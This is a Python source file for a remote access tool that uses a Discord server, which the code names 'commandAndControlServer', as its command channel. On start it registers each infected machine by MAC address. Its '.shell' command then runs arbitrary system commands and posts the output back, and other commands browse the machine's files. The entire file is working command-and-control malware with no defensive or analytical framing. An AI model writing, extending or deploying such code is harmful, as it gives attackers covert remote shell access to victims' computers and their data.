# THIS COMPONENT WILL:
# contain the BARE MINIMUM like shell, ls, cd, exit & reload

import os
import discord
import sys
from settings import guildid, bottoken
from uuid import getnode 

intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)
global mac_address
mac_address = str(getnode())
async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None


@client.event
async def on_ready():

    commandAndControlServer = client.get_guild(int(guildid))
    channel = await find_channel_by_name(commandAndControlServer, mac_address)
    if channel:
        await channel.send("Connection reestablished")
    else:
        channel = await commandAndControlServer.create_text_channel(mac_address)
        e = await channel.send("New Connection established")
        await e.pin()
        await channel.send("hello world")


@client.event
async def on_message(message):
    if message.author == client.user: 
        return
    else:
        match message.content.lower():
            case ".ls":
                file_list = "\n".join(os.listdir())
                if file_list == "":
                    file_list = "No Files Found"
                embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{file_list}```", color=0xfafafa)
                await message.reply(embed=embed)

            case ".exit":
                await message.channel.send("Exiting...")
                await client.close()

            case ".reload":
                await message.reply("restarting.")
                python_executable = sys.executable
                script_path = os.path.abspath(__file__)
                os.system(f"{python_executable} {script_path}")
                sys.exit()

        if message.content.lower().startswith(".cd"):
                desiredDirectory = message.content[4:]
                try:
                    os.chdir(desiredDirectory)
                    filesInDesiredDirectory = "\n".join(os.listdir())
                    if filesInDesiredDirectory == "":
                        filesInDesiredDirectory = "No Files Found"
                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{filesInDesiredDirectory}```", color=0xfafafa)
                except:
                    embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                await message.reply(embed=embed)

        elif message.content.lower().startswith(".shell"):
            command = message.content[7:]
            output = os.popen(command).read()
            if output == "":
                output = "No Output"
            embed = discord.Embed(title=f"Shell Command > {command}", description=f"```{output}```", color=0xfafafa)
            await message.reply(embed=embed)

client.run(bottoken)